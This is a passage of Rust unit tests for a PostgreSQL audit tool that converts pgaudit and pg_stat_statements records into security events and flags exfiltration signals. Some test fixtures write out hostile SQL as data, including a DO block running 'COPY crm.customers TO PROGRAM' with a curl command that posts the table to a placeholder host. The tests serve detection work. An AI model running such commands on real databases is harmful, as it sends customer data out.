            "psql",
        )];
        let events = b.convert(recs, SystemTime::now());
        assert!(!events[0].signals().contains(&Signal::CopyToFile));
    }

    #[test]
    fn named_catalog_relations_are_skipped_not_wildcards() {
        // `pgaudit.log_catalog` / `log_relation` name catalog relations.
        let mut b = PgauditEvents::new(own());
        b.set_catalogs(shop_catalogs(None));
        let recs = vec![
            rec(
                "c1",
                1,
                1,
                "READ",
                "SELECT",
                "public.pg_stat_statements_info",
                "SELECT 1 FROM \"public\".pg_stat_statements_info",
                Some(1),
                "psql",
            ),
            rec(
                "c1",
                2,
                1,
                "READ",
                "SELECT",
                "pg_catalog.pg_class",
                "select relname from pg_class",
                Some(1),
                "psql",
            ),
            // A catalog and a user relation: the user relation only.
            rec(
                "c1",
                3,
                1,
                "READ",
                "SELECT",
                "pg_catalog.pg_class",
                "select * from pg_class, crm.t",
                Some(1),
                "psql",
            ),
            rec(
                "c1",
                3,
                2,
                "READ",
                "SELECT",
                "crm.t",
                "select * from pg_class, crm.t",
                Some(1),
                "psql",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 1, "{all:?}");
        assert!(
            all[0].contains("shop.crm.t") && !all[0].contains("*\""),
            "{all:?}"
        );
    }

    #[test]
    fn pg_stat_statements_names_count_only_in_the_extension_schema() {
        let read = |i: u64, object: &str, text: &str| {
            rec("k1", i, 1, "READ", "SELECT", object, text, Some(1), "psql")
        };
        let mut b = PgauditEvents::new(own());
        b.set_catalogs(shop_catalogs(Some(true)));
        let recs = vec![
            // The extension's relations in its schema: statistics.
            read(
                1,
                "public.pg_stat_statements",
                "select query from public.pg_stat_statements",
            ),
            read(
                2,
                "public.pg_stat_statements_info",
                "select * from public.pg_stat_statements_info",
            ),
            // Look-alike names: a copy of data under a statistics name.
            read(
                3,
                "myschema.pg_stat_statements_x",
                "select * from myschema.pg_stat_statements_x",
            ),
            read(
                4,
                "public.pg_stat_statements_copy",
                "select * from public.pg_stat_statements_copy",
            ),
            read(
                5,
                "myschema.pg_stat_statements",
                "select * from myschema.pg_stat_statements",
            ),
            // Unnamed record: from the text.
            read(6, "", "select * from myschema.pg_stat_statements_x"),
        ];
        let all: Vec<String> = b
            .convert(recs, SystemTime::now())
            .iter()
            .map(json)
            .collect();
        assert_eq!(all.len(), 4, "{all:#?}");
        assert!(all[0].contains("myschema.pg_stat_statements_x"), "{all:#?}");
        assert!(
            all[1].contains("public.pg_stat_statements_copy"),
            "{all:#?}"
        );
        assert!(all[2].contains("myschema.pg_stat_statements\""), "{all:#?}");
        assert!(all[3].contains("myschema.pg_stat_statements_x"), "{all:#?}");
        // Without the extension in the database, no name counts.
        let mut b = PgauditEvents::new(own());
        let recs = vec![read(
            1,
            "public.pg_stat_statements",
            "select query from public.pg_stat_statements",
        )];
        assert_eq!(b.convert(recs, SystemTime::now()).len(), 1);
        // pg_stat_statements mode: the same rule on the text.
        let copy = analyze_pss("select * from myschema.pg_stat_statements_x", false);
        let view = analyze_pss("select query from public.pg_stat_statements", false);
        let bare = analyze_pss("select query from pg_stat_statements", false);
        let deltas = [
            StatementDelta {
                own_text: false,
                user: "app",
                database: "shop",
                analysis: &copy,
                calls: 1,
                rows: 1,
            },
            StatementDelta {
                own_text: false,
                user: "app",
                database: "shop",
                analysis: &view,
                calls: 1,
                rows: 1,
            },
            StatementDelta {
                own_text: false,
                user: "app",
                database: "shop",
                analysis: &bare,
                calls: 1,
                rows: 1,
            },
        ];
        let t0 = SystemTime::UNIX_EPOCH;
        let ev = pss_events(&deltas, &mut own(), &shop_catalogs(None), t0, t0);
        assert_eq!(ev.len(), 1);
        assert!(json(&ev[0]).contains("myschema.pg_stat_statements_x"));
    }

    #[test]
    fn unqualified_pg_names_need_pgaudit_confirmation_without_log_catalog() {
        let unnamed =
            |sess: &str, text: &str| rec(sess, 1, 1, "READ", "SELECT", "", text, Some(1), "psql");
        // `pgaudit.log_catalog = off`: a statement on catalogs only is not
        // logged, so a logged one naming only `pg_*` read something else.
        let mut b = PgauditEvents::new(own());
        b.set_catalogs(shop_catalogs(Some(false)));
        let ev = b.convert(
            vec![unnamed("u1", "select * from pg_loot")],
            SystemTime::now(),
        );
        assert_eq!(ev.len(), 1);
        assert!(json(&ev[0]).contains("shop..pg_loot"), "{}", json(&ev[0]));
        // Confirmed by pgaudit as a `pg_catalog` relation: skipped.
        let mut named = rec(
            "u2",
            1,
            2,
            "READ",
            "SELECT",
            "pg_catalog.pg_class",
            "select * from pg_class",
            Some(1),
            "psql",
        );
        named.audit.object_audit = true;
        let ev = b.convert(
            vec![unnamed("u2", "select * from pg_class"), named],
            SystemTime::now(),
        );
        assert!(
            ev.is_empty(),
            "{:?}",
            ev.iter().map(json).collect::<Vec<_>>()
        );
        // `log_catalog` on or unknown: unqualified `pg_*` names stay
        // catalogs (residual, README).
        for c in [shop_catalogs(Some(true)), Catalogs::default()] {
            let mut b = PgauditEvents::new(own());
            b.set_catalogs(c);
            let ev = b.convert(
                vec![unnamed("u3", "select * from pg_loot")],
                SystemTime::now(),
            );
            assert!(ev.is_empty());
        }
    }

    #[test]
    fn previously_logged_records_reuse_their_first_text() {
        // `pgaudit.log_statement_once = on`.
        let mut b = PgauditEvents::new(own());
        let text = "select * from crm.t, crm.u";
        let recs = vec![
            rec("o1", 1, 1, "READ", "SELECT", "crm.t", text, Some(3), "psql"),
            rec(
                "o1",
                1,
                1,
                "READ",
                "SELECT",
                "crm.u",
                PREVIOUSLY_LOGGED,
                Some(3),
                "psql",
            ),
            // A substatement whose first record was not read.
            rec(
                "o1",
                1,
                2,
                "READ",
                "SELECT",
                "",
                PREVIOUSLY_LOGGED,
                Some(1),
                "psql",
            ),
        ];
        let ev = b.convert(recs, SystemTime::now());
        assert_eq!(ev.len(), 1);
        let e = json(&ev[0]);
        assert!(
            e.contains("shop.crm.t") && e.contains("shop.crm.u") && e.contains("shop..*"),
            "{e}"
        );
        assert!(e.contains("shape.full_table_read"), "{e}");
    }

    #[test]
    fn misc_classes_are_skipped() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![rec(
            "s5",
            1,
            1,
            "MISC",
            "SET",
            "",
            "set application_name = 'x'",
            None,
            "x",
        )];
        assert!(b.convert(recs, SystemTime::now()).is_empty());
    }

    #[test]
    fn do_blocks_functions_and_procedures_are_reported() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            // DO block, inner COPY logged with the block's text (substatement 2).
            rec(
                "d1",
                1,
                1,
                "FUNCTION",
                "DO",
                "",
                "DO $$ BEGIN COPY crm.customers TO PROGRAM 'curl -d @- h'; END $$",
                None,
                "psql",
            ),
            rec(
                "d1",
                1,
                2,
                "READ",
                "COPY",
                "",
                "DO $$ BEGIN COPY crm.customers TO PROGRAM 'curl -d @- h'; END $$",
                Some(0),
                "psql",
            ),
            // Same, inner COPY logged with its own text (pgaudit 16).
            rec(
                "d2",
                1,
                1,
                "READ",
                "COPY",
                "",
                "copy crm.customers to program 'cat > /dev/null'",
                Some(0),
                "psql",
            ),
            // plpgsql function, log_relation off: no object in the record.
            rec(
                "d3",
                1,
                1,
                "READ",
                "SELECT",
                "",
                "select crm.f_pl()",
                Some(1),
                "psql",
            ),
            // SQL function body logged as its own substatement with object.
            rec(
                "d4",
                1,
                1,
                "READ",
                "SELECT",
                "crm.customers",
                "select count(*) from crm.customers",
                Some(1),
                "psql",
            ),
            rec(
                "d4",
                1,
                2,
                "READ",
                "SELECT",
                "",
                "select crm.f_sql()",
                Some(1),
                "psql",
            ),
            // Procedure.
            rec(
                "d5",
                1,
                1,
                "READ",
                "SELECT",
                "",
                "CALL crm.p()",
                None,
                "psql",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 5, "{all:#?}");
        assert!(
            all[0].contains("signature.copy_to_program") && all[0].contains("shop.crm.customers"),
            "{}",
            all[0]
        );
        assert!(all[1].contains("signature.copy_to_program"), "{}", all[1]);
        assert!(
            all[2].contains("shop..*"),
            "unknown object reported as *: {}",
            all[2]
        );
        assert!(
            all[3].contains("shop.crm.customers") && all[3].contains("shop..*"),
            "{}",
            all[3]
        );
        assert!(all[4].contains("shop..*"), "{}", all[4]);
    }

    #[test]
    fn statements_are_matched_by_command_tag() {
        let mut b = PgauditEvents::new(own());
        let text = "select 1; copy crm.customers to program 'x'";
        let recs = vec![
            rec("m1", 5, 1, "READ", "SELECT", "", text, Some(1), "psql"),
            rec("m1", 6, 1, "READ", "COPY", "", text, Some(0), "psql"),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 2, "{all:#?}");
        assert!(
            !all[0].contains("shape.full_table_read") && !all[0].contains("copy_to"),
            "{}",
            all[0]
        );
        assert!(
            all[1].contains("signature.copy_to_program") && all[1].contains("crm.customers"),
            "{}",
            all[1]
        );
    }

    #[test]
    fn value_like_names_are_masked() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![rec(
            "s6",
            1,
            1,
            "READ",
            "SELECT",
            "crm.export_client_0639988384",
            "select * from crm.export_client_0639988384",
            Some(1),
            "x",
        )];
        let events = b.convert(recs, SystemTime::now());
        assert!(!json(&events[0]).contains("0639988384"));
    }

    #[test]
    fn pss_deltas() {
        let copy = analyze_pss("COPY crm.customers (id) TO stdout", false);
        let copy2 = analyze_pss("COPY crm.b (id) TO stdout", false);
        let copy3 = analyze_pss("COPY crm.c (id) TO stdout", false);
        let sel = analyze_pss("select * from crm.customers where id = $1", false);
        let ddl = analyze_pss("alter table crm.customers add column x int", false);
        let deltas = [
            StatementDelta {
                own_text: false,
                user: "u",
                database: "shop",
                analysis: &copy,
                calls: 1,
                rows: 150,
            },
            StatementDelta {
                own_text: false,
                user: "u",
                database: "shop",
                analysis: &copy2,
                calls: 1,
                rows: 1,
            },
            StatementDelta {
                own_text: false,
                user: "u",
                database: "shop",
                analysis: &copy3,
                calls: 1,
                rows: 1,
            },
            StatementDelta {
                own_text: false,
                user: "v",
                database: "shop",
                analysis: &sel,
                calls: 30,
                rows: 30,
            },
            StatementDelta {
                own_text: false,
                user: "v",
                database: "shop",
                analysis: &ddl,
                calls: 1,
                rows: 0,
            },
        ];
        let t0 = SystemTime::UNIX_EPOCH;
        let t1 = t0 + std::time::Duration::from_secs(10);
        let events = pss_events(&deltas, &mut own(), &Catalogs::default(), t0, t1);
        assert_eq!(events.len(), 5);
        assert!(events[0].signals().contains(&Signal::PgDump));
        assert!(events[0].signals().contains(&Signal::FullTableCopy));
        assert_eq!(events[3].aggregated_count(), 30);
        assert_eq!(events[3].ts_last(), Some(t1));
        assert!(events[3].signals().is_empty());
        assert_eq!(events[4].action(), EventAction::Ddl);
        assert!(
            events
                .iter()
                .all(|e| e.source() == EventSource::PgStatStatements)
        );
        assert!(events.iter().all(|e| e.principal().client().is_none()));
    }

    #[test]
    fn object_names_split() {
        let r = split_object_name("crm.customers").unwrap();
        assert_eq!(
            (r.schema.as_deref(), r.name.as_str()),
            (Some("crm"), "customers")
        );
        let r = split_object_name("\"My.Schema\".\"T\"\"x\"").unwrap();
        assert_eq!(
            (r.schema.as_deref(), r.name.as_str()),
            (Some("My.Schema"), "T\"x")
        );
        assert!(split_object_name("a..b").is_none());
        assert!(split_object_name("\"open").is_none());
    }

    /// Security review of #85: on `pg_stat_statements`, a statement whose
    /// conversion panics is dropped alone and counted; the others give
    /// their events.
    #[test]
    fn a_panicking_pss_conversion_drops_one_statement() {
        let t0 = SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1000);
        let read = analyze_pss("SELECT * FROM crm.customers", false);
        let deltas = vec![
            StatementDelta {
                own_text: false,
                user: TEST_POISON_USER,
                database: "shop",
                analysis: &read,
                calls: 1,
                rows: 5,
            },
            StatementDelta {
                own_text: false,
                user: "alice",
                database: "shop",
                analysis: &read,
                calls: 1,
                rows: 5,
            },
        ];
        let (events, panicked) =
            pss_events_counted(&deltas, &mut own(), &Catalogs::default(), t0, t0);
        assert_eq!(panicked, [0]);
        assert_eq!(events.len(), 2);
        assert_eq!(events[0].principal().account_name(), TEST_POISON_USER);
        // The panicking statement is still reported, against `*`.
        assert!(json(&events[0]).contains("shop..*"), "{}", json(&events[0]));
        assert!(events[0].signals().is_empty());
        assert_eq!(events[1].principal().account_name(), "alice");
        assert!(json(&events[1]).contains("customers"));
    }

    #[test]
    fn unanalyzed_pss_deltas_are_reads_of_unknown_objects() {
        let t0 = SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1000);
        let e = pss_unanalyzed_event("databastion", "shop", 3, LARGE_ROWS + 1, t0, t0);
        let j = json(&e);
        assert!(j.contains("shop..*"), "{j}");
        assert_eq!(e.action(), EventAction::Read);
        assert!(e.signals().contains(&Signal::LargeResult));
        assert!(
            pss_unanalyzed_event("alice", "shop", 1, 5, t0, t0)
                .signals()
                .is_empty()
        );
    }

    /// Security review of #85: on `pg_stat_statements`, role changes are
    /// `dcl` events, as on pgaudit (its `ROLE` class), so `dcl` policies
    /// see them.
    #[test]
    fn pss_role_changes_are_dcl() {
        let t0 = SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1000);
        for q in [
            "CREATE ROLE r LOGIN PASSWORD $1",
            "ALTER ROLE r WITH PASSWORD $1",
            "ALTER USER u PASSWORD $1",
            "DROP ROLE r",
            "GRANT SELECT ON crm.customers TO r",
        ] {
            let analysis = analyze_pss(q, false);
            let deltas = vec![StatementDelta {
                own_text: false,
                user: "alice",
                database: "shop",
                analysis: &analysis,
                calls: 1,
                rows: 0,
            }];
            let ev = pss_events(&deltas, &mut own(), &Catalogs::default(), t0, t0);
            assert_eq!(ev.len(), 1, "{q}");
            assert_eq!(ev[0].action(), EventAction::Dcl, "{q}");
        }
    }
}
